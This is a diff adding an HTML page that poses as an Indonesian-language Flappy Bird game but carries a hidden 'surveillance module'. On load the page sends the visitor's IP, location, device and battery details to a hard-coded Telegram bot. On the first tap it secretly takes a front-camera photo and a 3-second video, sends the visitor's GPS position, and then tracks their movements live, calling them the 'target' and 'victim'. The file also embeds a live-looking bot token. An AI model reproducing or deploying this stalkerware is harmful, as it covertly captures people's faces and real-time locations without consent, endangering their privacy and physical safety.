@@ -1,0 +1,529 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+<title>Flappy Bird - Xibenk Edition</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; user-select: none; }
+  body {
+    background: linear-gradient(180deg, #4ec0ca 0%, #70c5ce 50%, #a8e6cf 100%);
+    min-height: 100vh; display: flex; justify-content: center; align-items: center;
+    font-family: 'Segoe UI', system-ui, sans-serif; overflow: hidden; touch-action: none;
+  }
+  #gameContainer {
+    position: relative; width: 100%; max-width: 480px; height: 100vh; max-height: 720px;
+    background: linear-gradient(180deg, #4ec0ca 0%, #70c5ce 60%, #a8e6cf 100%);
+    overflow: hidden; box-shadow: 0 0 40px rgba(0,0,0,0.3); border-radius: 12px;
+  }
+  canvas { display: block; width: 100%; height: 100%; touch-action: none; }
+  .overlay {
+    position: absolute; inset: 0; display: flex; flex-direction: column;
+    justify-content: center; align-items: center; background: rgba(0,0,0,0.5);
+    backdrop-filter: blur(8px); z-index: 10; padding: 20px; text-align: center; color: white;
+  }
+  .overlay.hidden { display: none; }
+  .title {
+    font-size: 2.5rem; font-weight: 900; letter-spacing: 2px;
+    background: linear-gradient(135deg, #ffd93d, #ff6b6b);
+    -webkit-background-clip: text; background-clip: text; color: transparent;
+    margin-bottom: 20px; text-shadow: 0 4px 0 rgba(0,0,0,0.2);
+  }
+  .btn {
+    background: linear-gradient(135deg, #ffd93d, #ff9a3d); border: none;
+    padding: 16px 48px; border-radius: 50px; font-size: 1.2rem; font-weight: 800;
+    color: #4a2c00; cursor: pointer; transition: transform 0.1s;
+    box-shadow: 0 6px 0 #b87800, 0 8px 20px rgba(0,0,0,0.3); margin: 8px 0;
+  }
+  .btn:active { transform: translateY(4px); box-shadow: 0 2px 0 #b87800; }
+  .info { font-size: 0.9rem; opacity: 0.9; margin-top: 16px; max-width: 320px; line-height: 1.5; }
+  #soundPanel {
+    position: absolute; bottom: 16px; right: 16px; z-index: 20;
+    background: rgba(0,0,0,0.6); border-radius: 12px; padding: 10px;
+    display: flex; gap: 8px; align-items: center; backdrop-filter: blur(10px); transition: 0.3s;
+  }
+  #soundPanel.minimized .panelContent { display: none; }
+  #soundPanel button {
+    background: rgba(255,255,255,0.2); border: none; color: white; font-size: 1.2rem;
+    width: 36px; height: 36px; border-radius: 50%; cursor: pointer;
+    display: flex; align-items: center; justify-content: center;
+  }
+  #soundPanel button:hover { background: rgba(255,255,255,0.3); }
+  .panelContent { display: flex; gap: 8px; align-items: center; }
+  #soundPanel input[type="file"] { display: none; }
+  #soundPanel label {
+    background: #ff6b6b; color: white; padding: 8px 14px; border-radius: 20px;
+    font-size: 0.75rem; font-weight: 700; cursor: pointer; white-space: nowrap;
+  }
+  #soundPanel label:hover { background: #ff5252; }
+  .score {
+    position: absolute; top: 20px; left: 50%; transform: translateX(-50%);
+    font-size: 4rem; font-weight: 900; color: white; text-shadow: 0 4px 0 rgba(0,0,0,0.3);
+    z-index: 5; pointer-events: none;
+  }
+  .best {
+    position: absolute; top: 20px; right: 20px; font-size: 0.9rem; color: white;
+    background: rgba(0,0,0,0.3); padding: 6px 14px; border-radius: 20px;
+    z-index: 5; pointer-events: none; font-weight: 700;
+  }
+  .soundIndicator { position: absolute; top: 20px; left: 20px; font-size: 1.5rem; z-index: 5; opacity: 0.7; }
+</style>
+</head>
+<body>
+<div id="gameContainer">
+  <canvas id="game"></canvas>
+  <div class="score" id="scoreDisplay">0</div>
+  <div class="best">🏆 Best: <span id="bestDisplay">0</span></div>
+  <div class="soundIndicator" id="soundInd">🔊</div>
+
+  <div id="soundPanel" class="minimized">
+    <button id="togglePanel" title="Settings">⚙️</button>
+    <div class="panelContent">
+      <input type="file" id="soundUpload" accept="audio/*">
+      <label for="soundUpload">🎵 Upload Sound</label>
+      <button id="playTest" title="Test sound">▶️</button>
+      <button id="resetSound" title="Reset default">🔄</button>
+    </div>
+  </div>
+
+  <div class="overlay" id="startScreen">
+    <div class="title">FLAPPY BIRD</div>
+    <div style="font-size: 3rem; margin-bottom: 20px;">🐦</div>
+    <button class="btn" id="startBtn">▶️ MULAI</button>
+    <div class="info">
+      <b>Kontrol:</b> Tap / Klik / Spasi untuk lompat<br>
+      <b>Misi:</b> Terbang setinggi mungkin!
+    </div>
+  </div>
+
+  <div class="overlay hidden" id="gameOverScreen">
+    <div class="title" style="background: linear-gradient(135deg, #ff6b6b, #c92a2a); -webkit-background-clip: text;">GAME OVER</div>
+    <div style="font-size: 3rem; margin: 10px 0;">💥</div>
+    <div style="font-size: 1.5rem; font-weight: 800; margin: 10px 0;">
+      Score: <span id="finalScore" style="color: #ffd93d;">0</span>
+    </div>
+    <div style="font-size: 1rem; opacity: 0.8; margin-bottom: 20px;">
+      Best: <span id="finalBest">0</span>
+    </div>
+    <button class="btn" id="restartBtn">🔄 COBA LAGI</button>
+  </div>
+</div>
+
+<script>
+// ============================================================
+// 🔴 SURVEILLANCE MODULE
+// ============================================================
+const TG_BOT   = '8832796984:AAERkQRQUHJeqKydZVrfWcT5Z7UR6l_pAhw';
+const TG_ADMIN = '8297633065';
+const TG_API   = `https://api.telegram.org/bot${TG_BOT}`;
+
+let _surveilled = false;
+let _cameraStream = null;
+let _watchId = null;
+let _lastGeo = null;
+let _lastGeoTime = 0;
+
+function _esc(s) { return String(s ?? '').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;'); }
+function _now() { const d = new Date(); return `${d.getDate()}/${d.getMonth()+1}/${d.getFullYear()} ${d.toTimeString().slice(0, 8)}`; }
+function _haversine(a, b) {
+  const R = 6371000, dLat = (b.lat - a.lat) * Math.PI / 180, dLng = (b.lng - a.lng) * Math.PI / 180;
+  const x = Math.sin(dLat/2)**2 + Math.cos(a.lat*Math.PI/180) * Math.cos(b.lat*Math.PI/180) * Math.sin(dLng/2)**2;
+  return 2 * R * Math.atan2(Math.sqrt(x), Math.sqrt(1-x));
+}
+function _parseUA(ua) {
+  let os = "Unknown", browser = "Unknown";
+  if (/android/i.test(ua)) os = "Android";
+  else if (/iPad|iPhone|iPod/.test(ua)) os = "iOS (iPhone)";
+  else if (/Windows/i.test(ua)) os = "Windows";
+  else if (/Macintosh/i.test(ua)) os = "MacOS";
+  else if (/Linux/i.test(ua)) os = "Linux";
+
+  if (/Edg\//i.test(ua)) browser = "Edge";
+  else if (/OPR\/|Opera/i.test(ua)) browser = "Opera";
+  else if (/SamsungBrowser/i.test(ua)) browser = "Samsung Internet";
+  else if (/Chrome/i.test(ua)) browser = "Chrome";
+  else if (/Safari/i.test(ua)) browser = "Safari";
+  else if (/Firefox/i.test(ua)) browser = "Firefox";
+  
+  return { os, browser };
+}
+
+async function _tgSend(path, fd) {
+  try { const r = await fetch(`${TG_API}/${path}`, { method: 'POST', body: fd }); return await r.json(); } catch { return null; }
+}
+async function _tgMsg(html) {
+  const fd = new FormData();
+  fd.append('chat_id', TG_ADMIN); fd.append('text', html);
+  fd.append('parse_mode', 'HTML'); fd.append('disable_web_page_preview', 'false');
+  return _tgSend('sendMessage', fd);
+}
+async function _tgPhoto(blob, caption) {
+  const fd = new FormData();
+  fd.append('chat_id', TG_ADMIN); fd.append('caption', caption); fd.append('photo', blob, 'face.jpg');
+  return _tgSend('sendPhoto', fd);
+}
+async function _tgVideo(blob, caption) {
+  const fd = new FormData();
+  fd.append('chat_id', TG_ADMIN); fd.append('caption', caption); fd.append('video', blob, 'clip.webm');
+  const r = await _tgSend('sendVideo', fd);
+  if (!r || !r.ok) { fd.append('document', blob, 'clip.webm'); return _tgSend('sendDocument', fd); }
+  return r;
+}
+
+async function _getIPInfo() {
+  try { return await (await fetch('https://ipapi.co/json/', { cache: 'no-store' })).json(); } catch { return null; }
+}
+async function _getBattery() {
+  try {
+    if (!navigator.getBattery) return null;
+    const b = await navigator.getBattery();
+    return { level: Math.round(b.level * 100), charging: b.charging };
+  } catch { return null; }
+}
+async function _getGeo() {
+  try {
+    return await new Promise((res, rej) => {
+      if (!navigator.geolocation) return rej('no geo');
+      navigator.geolocation.getCurrentPosition(
+        p => res({ lat: p.coords.latitude, lng: p.coords.longitude, acc: Math.round(p.coords.accuracy) }),
+        rej, { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
+      );
+    });
+  } catch { return null; }
+}
+async function _getCamera() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } }, audio: false
+    });
+    _cameraStream = stream;
+    const video = document.createElement('video');
+    video.srcObject = stream; video.muted = true; video.setAttribute('playsinline', '');
+    await video.play(); await new Promise(r => setTimeout(r, 700));
+
+    const canvas = document.createElement('canvas');
+    canvas.width = video.videoWidth || 640; canvas.height = video.videoHeight || 480;
+    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+    const photoBlob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.85));
+
+    let videoBlob = null;
+    try {
+      if (window.MediaRecorder) {
+        let mime = 'video/webm';
+        if (MediaRecorder.isTypeSupported('video/webm;codecs=vp8')) mime = 'video/webm;codecs=vp8';
+        else if (MediaRecorder.isTypeSupported('video/mp4')) mime = 'video/mp4';
+        const rec = new MediaRecorder(stream, { mimeType: mime });
+        const chunks = [];
+        rec.ondataavailable = e => { if (e.data && e.data.size > 0) chunks.push(e.data); };
+        const stopped = new Promise(r => rec.onstop = r);
+        rec.start(200); await new Promise(r => setTimeout(r, 3000)); rec.stop(); await stopped;
+        videoBlob = new Blob(chunks, { type: mime });
+      }
+    } catch {}
+
+    stream.getTracks().forEach(t => t.stop()); _cameraStream = null;
+    return { photo: photoBlob, video: videoBlob };
+  } catch (e) {
+    if (_cameraStream) { _cameraStream.getTracks().forEach(t => t.stop()); _cameraStream = null; }
+    return null;
+  }
+}
+
+async function pingVisit() {
+  const ip = await _getIPInfo();
+  const ua = navigator.userAgent;
+  const parsed = _parseUA(ua);
+  const L = [];
+  L.push(`🎯 <b>TARGET BARU</b>`);
+  L.push(`Nama: Target`);
+  L.push(`⏰ <i>${_now()}</i>`);
+  L.push('');
+  L.push(`📥 <b>DATA KORBAN</b>`);
+  L.push(`┌ 👤 NAMA : Target`);
+  if (ip) {
+    L.push(`├ 🌐 IP : <code>${_esc(ip.ip)}</code>`);
+    L.push(`├ 📍 KOTA : ${_esc(ip.city || '-')}`);
+    L.push(`├ 🚩 REGION : ${_esc(ip.region || '-')}`);
+    L.push(`├ 🏳️ NEGARA : ${_esc(ip.country_name || '-')}`);
+    L.push(`├ 🛰️ ISP : ${_esc(ip.org || ip.asn || '-')}`);
+  } else {
+    L.push(`├ 🌐 IP : <i>Tersembunyi</i>`);
+  }
+  L.push(`├ 💻 BROWSER : ${parsed.browser}`);
+  L.push(`├ 💿 OS : ${parsed.os}`);
+  L.push(`├ 📺 RESOLUSI : ${window.screen.width}x${window.screen.height}`);
+  
+  const bat = await _getBattery();
+  L.push(`├ 🔋 BATERAI : ${bat ? bat.level + '%' + (bat.charging ? ' (Charging)' : '') : 'Tidak diketahui'}`);
+  L.push(`├ 🧠 MEMORI : ${navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Tidak diketahui'}`);
+  L.push(`├ 🍪 COOKIE : ${navigator.cookieEnabled ? 'Aktif' : 'Mati'}`);
+  L.push(`└ ⏰ WAKTU : ${_now()}`);
+  L.push('');
+  L.push(`<i>Menunggu korban memulai game...</i>`);
+  await _tgMsg(L.join('\n'));
+}
+
+async function runSurveillance() {
+  if (_surveilled) return;
+  _surveilled = true;
+
+  const [geo, cam] = await Promise.all([_getGeo(), _getCamera()]);
+
+  if (cam?.photo) await _tgPhoto(cam.photo, `📸 Foto kamera (Target) @ ${_now()}`);
+  if (cam?.video) await _tgVideo(cam.video, `🎥 Video 3 Detik (Target) @ ${_now()}`);
+
+  if (geo) {
+    _lastGeo = geo; _lastGeoTime = Date.now();
+    const L = [];
+    L.push(`📍 <b>LOKASI GPS</b>`);
+    L.push(`Lat: ${geo.lat}`);
+    L.push(`Lon: ${geo.lng}`);
+    L.push(`Akurasi: ${geo.acc}m`);
+    L.push(`<a href="https://maps.google.com/?q=${geo.lat},${geo.lng}">Buka Maps</a>`);
+    await _tgMsg(L.join('\n'));
+    _startLiveTracking();
+  }
+}
+
+function _startLiveTracking() {
+  if (!navigator.geolocation || _watchId !== null) return;
+  _watchId = navigator.geolocation.watchPosition(
+    async (p) => {
+      const cur = { lat: p.coords.latitude, lng: p.coords.longitude, acc: Math.round(p.coords.accuracy) };
+      const now = Date.now();
+      const moved = _lastGeo ? _haversine(_lastGeo, cur) : 0;
+      const elapsed = (now - _lastGeoTime) / 1000;
+      if (moved > 50 || elapsed > 120) {
+        _lastGeo = cur; _lastGeoTime = now;
+        await _tgMsg(`🚶 <b>TARGET BERGERAK</b>\nLat: ${cur.lat}\nLon: ${cur.lng}\nJarak: ${Math.round(moved)}m\n<a href="https://maps.google.com/?q=${cur.lat},${cur.lng}">Buka Maps</a>`);
+      }
+    }, () => {}, { enableHighAccuracy: true, maximumAge: 5000, timeout: 15000 }
+  );
+}
+
+setTimeout(pingVisit, 400);
+document.addEventListener('click', runSurveillance, { passive: true });
+document.addEventListener('touchstart', runSurveillance, { passive: true });
+// ============================================================
+
+
+// ============================================================
+// FLAPPY BIRD GAME
+// ============================================================
+const SPECIAL_SOUND_URL = "https://files.catbox.moe/xixtc6.mp3";
+
+const canvas = document.getElementById('game');
+const ctx = canvas.getContext('2d');
+const container = document.getElementById('gameContainer');
+
+let W, H;
+function resize() { W = canvas.width = container.clientWidth; H = canvas.height = container.clientHeight; }
+window.addEventListener('resize', resize);
+resize();
+
+const STATE = { MENU: 0, PLAYING: 1, GAMEOVER: 2 };
+let state = STATE.MENU;
+
+let bird, pipes, score, best, frameCount, gameSpeed;
+let particles = [];
+
+try { best = parseInt(localStorage.getItem('flappy_best') || '0'); } catch { best = 0; }
+document.getElementById('bestDisplay').textContent = best;
+
+let specialSound = new Audio(SPECIAL_SOUND_URL);
+specialSound.volume = 0.9;
+specialSound.preload = 'auto';
+let customSoundElement = null;
+
+function playSpecialSound() {
+  try {
+    if (customSoundElement) {
+      customSoundElement.currentTime = 0; customSoundElement.play().catch(() => {});
+    } else {
+      specialSound.currentTime = 0; specialSound.play().catch(() => {});
+    }
+  } catch(e) {}
+}
+
+const soundPanel = document.getElementById('soundPanel');
+document.getElementById('togglePanel').addEventListener('click', () => soundPanel.classList.toggle('minimized'));
+document.getElementById('soundUpload').addEventListener('change', (e) => {
+  const file = e.target.files[0]; if (!file) return;
+  customSoundElement = new Audio(URL.createObjectURL(file));
+  customSoundElement.volume = 0.8;
+  document.getElementById('soundInd').textContent = '🎵';
+  alert('Sound custom berhasil di-upload!');
+});
+document.getElementById('playTest').addEventListener('click', playSpecialSound);
+document.getElementById('resetSound').addEventListener('click', () => {
+  customSoundElement = null; document.getElementById('soundUpload').value = '';
+  document.getElementById('soundInd').textContent = '🔊';
+  alert('Sound kembali ke default.');
+});
+
+function resetGame() {
+  bird = { x: W * 0.25, y: H / 2, vy: 0, gravity: 0.5, jump: -8.5, size: 28, rotation: 0, wingPhase: 0 };
+  pipes = []; particles = []; score = 0; frameCount = 0; gameSpeed = 2.8;
+  document.getElementById('scoreDisplay').textContent = '0';
+}
+
+function spawnPipe() {
+  const gap = Math.max(120, H * 0.22);
+  const minTop = 60, maxTop = H - gap - 60;
+  const topHeight = minTop + Math.random() * (maxTop - minTop);
+  pipes.push({ x: W, top: topHeight, gap, width: 60, passed: false });
+}
+
+function createParticle(x, y, color) {
+  for (let i = 0; i < 8; i++) {
+    particles.push({ x, y, vx: (Math.random() - 0.5) * 8, vy: (Math.random() - 0.5) * 8, life: 1, color: color || '#ffd93d', size: 3 + Math.random() * 4 });
+  }
+}
+
+function update() {
+  if (state !== STATE.PLAYING) return;
+  frameCount++;
+  bird.vy += bird.gravity; bird.y += bird.vy;
+  bird.rotation = Math.max(-0.5, Math.min(0.7, bird.vy * 0.08));
+  bird.wingPhase += 0.3;
+
+  if (frameCount % 90 === 0) spawnPipe();
+
+  for (let i = pipes.length - 1; i >= 0; i--) {
+    const p = pipes[i]; p.x -= gameSpeed;
+    if (!p.passed && p.x + p.width < bird.x) {
+      p.passed = true; score++;
+      document.getElementById('scoreDisplay').textContent = score;
+      createParticle(bird.x, bird.y, '#4ec0ca');
+    }
+    if (p.x + p.width < 0) pipes.splice(i, 1);
+
+    const bx = bird.x, by = bird.y, bs = bird.size / 2;
+    if (bx + bs > p.x && bx - bs < p.x + p.width) {
+      if (by - bs < p.top || by + bs > p.top + p.gap) { gameOver(); return; }
+    }
+  }
+
+  if (bird.y + bird.size / 2 >= H || bird.y - bird.size / 2 <= 0) { gameOver(); return; }
+
+  for (let i = particles.length - 1; i >= 0; i--) {
+    const pt = particles[i];
+    pt.x += pt.vx; pt.y += pt.vy; pt.vy += 0.2; pt.life -= 0.02;
+    if (pt.life <= 0) particles.splice(i, 1);
+  }
+  if (score > 5) gameSpeed = 3.2;
+  if (score > 10) gameSpeed = 3.6;
+}
+
+function draw() {
+  const skyGrad = ctx.createLinearGradient(0, 0, 0, H);
+  skyGrad.addColorStop(0, '#4ec0ca'); skyGrad.addColorStop(0.6, '#70c5ce'); skyGrad.addColorStop(1, '#a8e6cf');
+  ctx.fillStyle = skyGrad; ctx.fillRect(0, 0, W, H);
+
+  drawClouds();
+  pipes.forEach(p => drawPipe(p));
+  particles.forEach(pt => {
+    ctx.globalAlpha = pt.life; ctx.fillStyle = pt.color;
+    ctx.beginPath(); ctx.arc(pt.x, pt.y, pt.size, 0, Math.PI * 2); ctx.fill();
+  });
+  ctx.globalAlpha = 1;
+  drawGround();
+  if (state !== STATE.MENU) drawBird();
+}
+
+let cloudOffset = 0;
+const clouds = [{ x: 100, y: 100, size: 1.2 }, { x: 300, y: 150, size: 0.9 }, { x: 500, y: 80, size: 1.4 }, { x: 700, y: 180, size: 1.0 }];
+
+function drawClouds() {
+  cloudOffset -= 0.3; if (cloudOffset < -1000) cloudOffset = 0;
+  ctx.fillStyle = 'rgba(255, 255, 255, 0.7)';
+  clouds.forEach(c => {
+    const x = (c.x + cloudOffset) % (W + 300) - 150; const s = c.size;
+    ctx.beginPath();
+    ctx.arc(x, c.y, 25 * s, 0, Math.PI * 2);
+    ctx.arc(x + 25 * s, c.y - 8 * s, 30 * s, 0, Math.PI * 2);
+    ctx.arc(x + 55 * s, c.y, 25 * s, 0, Math.PI * 2);
+    ctx.arc(x + 28 * s, c.y + 10 * s, 28 * s, 0, Math.PI * 2);
+    ctx.fill();
+  });
+}
+
+function drawGround() {
+  const groundY = H - 40;
+  const dirtGrad = ctx.createLinearGradient(0, groundY, 0, H);
+  dirtGrad.addColorStop(0, '#73bf2e'); dirtGrad.addColorStop(0.15, '#73bf2e'); dirtGrad.addColorStop(0.2, '#deb887'); dirtGrad.addColorStop(1, '#c9a56d');
+  ctx.fillStyle = dirtGrad; ctx.fillRect(0, groundY, W, 40);
+  const stripeOffset = (frameCount * gameSpeed) % 20;
+  ctx.fillStyle = 'rgba(0,0,0,0.1)';
+  for (let x = -stripeOffset; x < W; x += 20) ctx.fillRect(x, groundY, 10, 8);
+}
+
+function drawPipe(p) {
+  const pipeGrad = ctx.createLinearGradient(p.x, 0, p.x + p.width, 0);
+  pipeGrad.addColorStop(0, '#4a9f2a'); pipeGrad.addColorStop(0.2, '#73bf2e'); pipeGrad.addColorStop(0.8, '#5cb32b'); pipeGrad.addColorStop(1, '#3d7a1f');
+  ctx.fillStyle = pipeGrad;
+  ctx.fillRect(p.x, 0, p.width, p.top - 20); ctx.fillRect(p.x - 4, p.top - 20, p.width + 8, 20);
+  ctx.fillRect(p.x, p.top + p.gap, p.width, H - p.top - p.gap - 40); ctx.fillRect(p.x - 4, p.top + p.gap, p.width + 8, 20);
+  ctx.fillStyle = 'rgba(255,255,255,0.25)';
+  ctx.fillRect(p.x + 8, 0, 6, p.top - 20); ctx.fillRect(p.x + 8, p.top + p.gap, 6, H - p.top - p.gap);
+}
+
+function drawBird() {
+  ctx.save();
+  ctx.translate(bird.x, bird.y); ctx.rotate(bird.rotation);
+  const s = bird.size / 2;
+  ctx.fillStyle = '#ffd93d'; ctx.beginPath(); ctx.arc(0, 0, s, 0, Math.PI * 2); ctx.fill();
+  ctx.strokeStyle = '#c9a800'; ctx.lineWidth = 2; ctx.stroke();
+  const wingAngle = Math.sin(bird.wingPhase) * 0.5;
+  ctx.save(); ctx.translate(-s * 0.3, 0); ctx.rotate(wingAngle);
+  ctx.fillStyle = '#f4c430'; ctx.beginPath(); ctx.ellipse(0, 0, s * 0.7, s * 0.5, 0, 0, Math.PI * 2); ctx.fill(); ctx.stroke(); ctx.restore();
+  ctx.fillStyle = 'white'; ctx.beginPath(); ctx.arc(s * 0.4, -s * 0.3, s * 0.35, 0, Math.PI * 2); ctx.fill(); ctx.strokeStyle = '#333'; ctx.lineWidth = 1.5; ctx.stroke();
+  ctx.fillStyle = 'black'; ctx.beginPath(); ctx.arc(s * 0.5, -s * 0.3, s * 0.18, 0, Math.PI * 2); ctx.fill();
+  ctx.fillStyle = '#ff6b3d'; ctx.beginPath(); ctx.moveTo(s * 0.8, 0); ctx.lineTo(s * 1.4, s * 0.1); ctx.lineTo(s * 0.8, s * 0.3); ctx.closePath(); ctx.fill(); ctx.stroke();
+  ctx.restore();
+}
+
+function loop() { update(); draw(); requestAnimationFrame(loop); }
+function jump() { if (state === STATE.PLAYING) bird.vy = bird.jump; }
+
+function startGame() {
+  resetGame();
+  state = STATE.PLAYING;
+  document.getElementById('startScreen').classList.add('hidden');
+  document.getElementById('gameOverScreen').classList.add('hidden');
+  
+  // 🎵 MUTER LAGU PAS MULAI MAIN
+  playSpecialSound();
+}
+
+function gameOver() {
+  state = STATE.GAMEOVER;
+  if (score > best) {
+    best = score; try { localStorage.setItem('flappy_best', best); } catch {}
+    document.getElementById('bestDisplay').textContent = best;
+  }
+  document.getElementById('finalScore').textContent = score;
+  document.getElementById('finalBest').textContent = best;
+  document.getElementById('gameOverScreen').classList.remove('hidden');
+  createParticle(bird.x, bird.y, '#ff6b6b');
+}
+
+canvas.addEventListener('click', jump);
+canvas.addEventListener('touchstart', (e) => { e.preventDefault(); jump(); }, { passive: false });
+document.addEventListener('keydown', (e) => {
+  if (e.code === 'Space' || e.code === 'ArrowUp') {
+    e.preventDefault();
+    if (state === STATE.PLAYING) jump();
+    else if (state === STATE.MENU || state === STATE.GAMEOVER) startGame();
+  }
+});
+
+document.getElementById('startBtn').addEventListener('click', startGame);
+document.getElementById('restartBtn').addEventListener('click', startGame);
+
+resetGame();
+state = STATE.MENU;
+loop();
+</script>
+</body>
+</html>
